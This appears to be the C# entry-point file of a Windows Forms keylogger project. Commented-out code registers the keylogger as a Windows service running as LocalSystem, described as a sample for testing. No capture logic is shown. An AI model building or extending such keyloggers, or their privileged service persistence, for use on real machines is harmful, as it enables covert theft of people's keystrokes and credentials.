using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using Modules.Keylogger;

namespace Keylogger3
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}


//var exitCode = HostFactory.Run(x =>
//{
//    x.Service<Keylogger>(s =>
//    {
//        s.ConstructUsing(keylogger => new Keylogger());
//        s.WhenStarted(keylogger => keylogger.StartKeylogger());
//        s.WhenStopped(keylogger => keylogger.StopKeylogger());
//    });

//    x.RunAsLocalSystem();

//    x.SetServiceName("keylogger");
//    x.SetDisplayName("KeyLogger");
//    x.SetDescription("This is a sample keylogger service used for testing");
//});

//int exitCodeValue = (int)Convert.ChangeType(exitCode, exitCode.GetTypeCode());
//Environment.ExitCode = exitCodeValue;
